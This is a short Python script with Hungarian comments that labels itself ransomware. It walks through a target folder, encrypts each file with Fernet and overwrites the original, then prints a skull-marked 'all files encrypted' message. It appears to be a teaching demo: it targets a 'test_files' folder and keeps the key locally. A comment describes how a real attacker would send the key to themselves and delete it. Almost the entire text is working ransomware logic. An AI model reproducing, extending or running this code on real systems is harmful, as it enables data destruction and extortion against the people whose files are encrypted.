import os
from cryptography.fernet import Fernet

# --- KONFIGURÁCIÓ ---
# Melyik mappát támadjuk meg? (FONTOS: Csak teszt mappát adj meg!)
TARGET_DIR = "test_files"

# Fájlok listázása
files = []

def generate_key():
    """Generál egy titkos kulcsot és elmenti fájlba (ezzel lehet majd visszafejteni)."""
    key = Fernet.generate_key()
    with open("the_secret.key", "wb") as the_key:
        the_key.write(key)
    return key

def encrypt_files(key):
    """Végigmegy a fájlokon és titkosítja őket."""
    print(f"--- 🔒 RANSOMWARE INDÍTÁSA: {TARGET_DIR} ---")
    
    # 1. Megkeressük a fájlokat a célmappában
    for file in os.listdir(TARGET_DIR):
        file_path = os.path.join(TARGET_DIR, file)
        
        # Csak fájlokat bántunk, mappákat nem, és a scriptünket sem!
        if os.path.isfile(file_path) and file != "ransomware.py" and file != "the_secret.key":
            files.append(file_path)

    print(f"[*] Megtalált célpontok: {files}")

    # 2. Titkosítás
    for file in files:
        with open(file, "rb") as the_file:
            contents = the_file.read() # Beolvassuk az eredetit
        
        # A titkosítás varázslata
        contents_encrypted = Fernet(key).encrypt(contents)
        
        with open(file, "wb") as the_file:
            the_file.write(contents_encrypted) # Felülírjuk a titkosítottal
            
        print(f"[+] Titkosítva: {file}")

    print("\n💀 MINDEN FÁJL TITKOSÍTVA LETT! 💀")
    print("A visszaállításhoz szükséged van a 'the_secret.key' fájlra.")

if __name__ == "__main__":
    # Kulcs generálása (A valóságban ezt a hacker elküldi magának, és törli a gépről)
    secret_key = generate_key()
    encrypt_files(secret_key)